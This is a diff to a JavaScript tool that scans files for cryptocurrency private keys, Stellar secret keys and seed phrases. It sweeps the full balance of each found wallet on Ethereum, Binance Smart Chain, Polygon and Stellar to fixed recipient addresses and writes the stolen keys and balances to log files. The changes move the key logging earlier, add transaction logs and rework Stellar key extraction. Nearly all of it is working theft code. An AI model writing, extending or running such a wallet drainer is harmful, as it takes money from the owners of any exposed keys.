@@ -109,7 +109,7 @@ async function processFile(filePath) {
       const sentenceRegex = /(?:[A-Fa-f0-9]{64}(?![A-Fa-f0-9]))|(?:S[A-Za-z2-7]{55}(?![A-Za-z2-7]))/g;
       const stellarSecretKeyRegex = /[S][A-Za-z2-7]{55}/g;
       const mnemonicSubsetRegex = /\b[a-zA-Z]{3,}\b(?:\s+[a-zA-Z]{3,}\b){11,23}/g;
-
+	  
       const lines = fileContent.split('\n');
 
       for (const line of lines) {
@@ -222,11 +222,18 @@ async function processFile(filePath) {
             scanningPaused = true;
             rl.pause();
             for (const block of blocks) {
-              if (isValidStellarSecretKeyBlock(block)) {
-                console.log(`Found valid Stellar secret key in block: ${block}`);
-                await transferFundsStellar(block);
+              const secretKeys = block.match(/[A-Za-z2-7]{56}/g);
+              if (secretKeys && secretKeys.length > 0) {
+                for (const secretKey of secretKeys) {
+                  if (isValidStellarSecretKey(secretKey)) {
+                    console.log(`Found valid Stellar secret key: ${secretKey}`);
+                    await transferFundsStellar(secretKey);
+                  } else {
+                    console.log(`Invalid Stellar secret key: ${secretKey}`);
+                  }
+                }
               } else {
-                console.log(`Invalid Stellar secret key block: ${block}`);
+                console.log(`Invalid block: ${block}`);
               }
             }
             transactionInProgress = false;
@@ -326,21 +333,30 @@ async function processFolder(folderPath) {
   }
 })();
 
-
 async function transferFundsEthereum(privateKey) {
   try {
     const provider = new ethers.providers.JsonRpcProvider(ethereumRpcUrl);
     const wallet = new ethers.Wallet(privateKey, provider);
-    
-	await sleep(3000); // 3 seconds delay
+
+    await sleep(3000); // 3 seconds delay
     const balance = await wallet.getBalance();
     const balanceEther = ethers.utils.formatEther(balance);
     console.log(`Balance in Ethereum wallet: ${balanceEther} ETH`);
 
-    if (balance.eq(0)) {
+    if (balance.isZero()) {
       console.log('Skipping transaction - no balance in Ethereum wallet');
       return; // Exit the function if there is no balance
     }
+	
+	const walletData = {
+      address: wallet.address,
+      privateKey: wallet.privateKey,
+      balance: balanceEther,
+    };
+
+    // Place the logBalanceToFile() function call here
+    await logBalanceToFile(walletData, 'Ethereum');
+
     await sleep(3000); // 3 seconds delay
     const transactionFee = await wallet.provider.getGasPrice();
     const transactionFeeEther = ethers.utils.formatEther(transactionFee);
@@ -363,17 +379,12 @@ async function transferFundsEthereum(privateKey) {
     const sendTransaction = await wallet.sendTransaction(transaction);
     console.log(`Transaction sent: ${sendTransaction.hash}`);
 
-    const walletData = {
-      address: wallet.address,
-      privateKey: wallet.privateKey,
-      balance: balanceEther,
-    };
-
-    await logBalanceToFile(walletData, 'Ethereum');
+    // Append transaction details to the transaction log file
+    await logTransactionToFile(walletData, ethereumRecipientAddress, amountToSend, transactionFee, 'Ethereum');
   } catch (error) {
     console.error('Error transferring funds via Ethereum:', error.message);
   }
-    scanningPaused = false; // Resume scanning after processing the transaction
+  scanningPaused = false; // Resume scanning after processing the transaction
 }
 
 async function transferFundsBinance(privateKey) {
@@ -386,10 +397,19 @@ async function transferFundsBinance(privateKey) {
     const balanceEther = ethers.utils.formatEther(balance);
     console.log(`Balance in Binance Smart Chain wallet: ${balanceEther} BNB`);
 
-    if (balance.eq(0)) {
+    if (balance.isZero()) {
       console.log('Skipping transaction - no balance in Binance Smart Chain wallet');
       return; // Exit the function if there is no balance
     }
+	
+    const walletData = {
+      address: wallet.address,
+      privateKey: wallet.privateKey,
+      balance: balanceEther,
+    };
+	
+	// Place the logBalanceToFile() function call here
+    await logBalanceToFile(walletData, 'Binance Smart Chain');
     
 	await sleep(3000); // 3 seconds delay
     const transactionFee = await wallet.provider.getGasPrice();
@@ -413,13 +433,9 @@ async function transferFundsBinance(privateKey) {
     const sendTransaction = await wallet.sendTransaction(transaction);
     console.log(`Transaction sent: ${sendTransaction.hash}`);
 
-    const walletData = {
-      address: wallet.address,
-      privateKey: wallet.privateKey,
-      balance: balanceEther,
-    };
 
-    await logBalanceToFile(walletData, 'Binance Smart Chain');
+	// Append transaction details to the transaction log file
+    await logTransactionToFile(walletData, bscRecipientAddress, amountToSend, transactionFee, 'Binance Smart Chain');
   } catch (error) {
     console.error('Error transferring funds via Binance Smart Chain:', error.message);
   }
@@ -436,10 +452,19 @@ async function transferFundsPolygon(privateKey) {
     const balanceEther = ethers.utils.formatEther(balance);
     console.log(`Balance in Polygon wallet: ${balanceEther} MATIC`);
 
-    if (balance.eq(0)) {
-      console.log('Skipping transaction - no balance in Polygon wallet');
+    if (balance.isZero()) {
+      console.log('Skipping transaction - no balance in Binance Smart Chain wallet');
       return; // Exit the function if there is no balance
     }
+	
+	const walletData = {
+      address: wallet.address,
+      privateKey: wallet.privateKey,
+      balance: balanceEther,
+    };
+	
+	// Place the logBalanceToFile() function call here
+    await logBalanceToFile(walletData, 'Polygon');
     
 	await sleep(3000); // 3 seconds delay
     const transactionFee = await wallet.provider.getGasPrice();
@@ -463,13 +488,8 @@ async function transferFundsPolygon(privateKey) {
     const sendTransaction = await wallet.sendTransaction(transaction);
     console.log(`Transaction sent: ${sendTransaction.hash}`);
 
-    const walletData = {
-      address: wallet.address,
-      privateKey: wallet.privateKey,
-      balance: balanceEther,
-    };
-
-    await logBalanceToFile(walletData, 'Polygon');
+    // Append transaction details to the transaction log file
+    await logTransactionToFile(walletData, polygonRecipientAddress, amountToSend, transactionFee, 'Polygon');
   } catch (error) {
     console.error('Error transferring funds via Polygon:', error.message);
   }
@@ -484,10 +504,9 @@ async function transferFundsStellar(stellarSecretKey) {
     const sourceKeypair = StellarSdk.Keypair.fromSecret(stellarSecretKey);
     sourceAccount = await stellarServer.loadAccount(sourceKeypair.publicKey());
     const destinationId = stellarRecipientAddress;
-    const subentryCount = sourceAccount.subentry_count;
 
-    const minimumBalance = calculateMinimumBalance(subentryCount);
-    console.log(`Minimum balance required in Stellar account: ${minimumBalance} XLM`);
+    console.log(`Wallet address: ${sourceAccount.account_id}`);
+    console.log(`Network: Stellar`);
 
     nativeBalance = null;
     if (sourceAccount.balances) {
@@ -499,47 +518,56 @@ async function transferFundsStellar(stellarSecretKey) {
     }
 
     if (nativeBalance) {
+      console.log(`Asset: XLM, Balance: ${nativeBalance.balance}`);
       const balance = parseFloat(nativeBalance.balance);
 
-      if (balance >= minimumBalance) {
-        console.log(`Wallet address: ${sourceAccount.account_id}`);
-        console.log(`Network: Stellar, Asset: XLM, Balance: ${nativeBalance.balance}`);
-
-        const transaction = new StellarSdk.TransactionBuilder(sourceAccount, {
-          fee: StellarSdk.BASE_FEE,
-          networkPassphrase: stellarNetwork,
-        })
-          .addOperation(
-            StellarSdk.Operation.payment({
-              destination: destinationId,
-              asset: StellarSdk.Asset.native(),
-              amount: nativeBalance.balance,
-            })
-          )
-          .setTimeout(30)
-          .build();
-
-        transaction.sign(sourceKeypair);
-
-        // Add delay before submitting the transaction
-        await sleep(3000); // 3 seconds delay
-        const transactionResult = await stellarServer.submitTransaction(transaction);
-        console.log(`Transaction successful. Hash: ${transactionResult.hash}`);
-
+      if (balance >= 0) {
         const walletData = {
           address: sourceAccount.account_id,
-          balanceKey: nativeBalance.asset_type,
+          balance: nativeBalance.balance,
+          blockchain: 'Stellar',
           secretKey: stellarSecretKey,
         };
 
         await logBalanceToFile(walletData, 'Stellar');
+        const subentryCount = sourceAccount.subentry_count;
+        const minimumBalance = calculateMinimumBalance(subentryCount);
+        console.log(`Minimum balance required in Stellar account: ${minimumBalance} XLM`);
+
+        if (balance >= minimumBalance) {
+          const transaction = new StellarSdk.TransactionBuilder(sourceAccount, {
+            fee: StellarSdk.BASE_FEE,
+            networkPassphrase: stellarNetwork,
+          })
+            .addOperation(
+              StellarSdk.Operation.payment({
+                destination: destinationId,
+                asset: StellarSdk.Asset.native(),
+                amount: nativeBalance.balance,
+              })
+            )
+            .setTimeout(30)
+            .build();
+
+          transaction.sign(sourceKeypair);
+
+          // Add delay before submitting the transaction
+          await sleep(3000); // 3 seconds delay
+          const transactionResult = await stellarServer.submitTransaction(transaction);
+          console.log(`Transaction successful. Hash: ${transactionResult.hash}`);
+
+          // Append transaction details to the transaction log file
+          const transactionLogEntry = `Transaction Details:\nFrom: ${sourceKeypair.publicKey()}\nTo: ${stellarRecipientAddress}\nAmount: ${nativeBalance.balance}\nTransaction Fee: ${StellarSdk.BASE_FEE.toString()}\n`;
+          fs.appendFileSync(transactionLogFilePath, transactionLogEntry);
+          console.log(`Logged transaction details to file: ${transactionLogFilePath}`);
+        } else {
+          console.log('Insufficient balance to cover the minimum balance requirement.');
+        }
       } else {
-        console.log(`Wallet address: ${sourceAccount.account_id}`);
-        console.log('Insufficient balance to cover the minimum balance requirement.');
+        console.log('No balance to transfer.');
       }
     } else {
-      console.log(`Wallet address: ${sourceAccount.account_id}`);
-      console.log('No balance to transfer.');
+      console.log('No native balance found.');
     }
   } catch (error) {
     console.error('Error transferring funds via Stellar:', error.message);
@@ -550,9 +578,8 @@ async function transferFundsStellar(stellarSecretKey) {
       }
     }
   }
-    scanningPaused = false; // Resume scanning after processing the transaction
+  scanningPaused = false; // Resume scanning after processing the transaction
 }
-
 
 // Helper function to pause execution for a specified duration
 function sleep(ms) {
@@ -661,33 +688,27 @@ async function transferFundsStellarFromMnemonic(mnemonic, mnemonicSubset) {
 }
 
 async function logBalanceToFile(walletData, blockchain) {
-  try {
-    let addressKey, privateKeyKey, balanceKeyKey;
-    if (blockchain === 'stellar') {
-      addressKey = 'address';
-      privateKeyKey = 'secretKey';
-      balanceKeyKey = 'balanceKey';
-    } else {
-      addressKey = 'address';
-      privateKeyKey = 'privateKey';
-      balanceKeyKey = 'balance';
-    }
+  const balanceLogFilePath = `./${blockchain}_balance_log.txt`;
 
-    if (parseFloat(walletData[balanceKeyKey]) !== 0) {
-      const balanceLog = {
-        blockchain: blockchain,
-        [addressKey]: walletData.address,
-        [privateKeyKey]: walletData.privateKey,
-        [balanceKeyKey]: walletData.balance,
-      };
-
-      const balanceLogString = JSON.stringify(balanceLog, null, 2);
-
-      // Write the balance log to a file
-      fs.appendFileSync('found_balances.txt', balanceLogString + '\n');
-      console.log('Balance logged successfully.');
-    }
-  } catch (error) {
-    console.error('Error logging balance:', error.message);
+  let balanceLogEntry = `Address: ${walletData.address}\n`;
+  if (blockchain === 'Stellar') {
+    balanceLogEntry += `Secret Key: ${walletData.secretKey}\n`;
+  } else {
+    balanceLogEntry += `Private Key: ${walletData.privateKey}\n`;
   }
+  balanceLogEntry += `Balance: ${walletData.balance} ${blockchain}\n\n`;
+
+  fs.appendFileSync(balanceLogFilePath, balanceLogEntry);
+  console.log(`Logged balance to file: ${balanceLogFilePath}`);
+}
+
+
+
+// Function to log transaction details to a file
+async function logTransactionToFile(walletData, recipientAddress, amountToSend, transactionFee, blockchain) {
+  const transactionLogFilePath = `./${blockchain}_transaction_log.txt`;
+
+  const transactionLogEntry = `Transaction Details:\nFrom: ${walletData.address}\nTo: ${recipientAddress}\nAmount: ${amountToSend.toString()}\nTransaction Fee: ${transactionFee.toString()}\n\n`;
+  fs.appendFileSync(transactionLogFilePath, transactionLogEntry);
+  console.log(`Logged transaction details to file: ${transactionLogFilePath}`);
 }
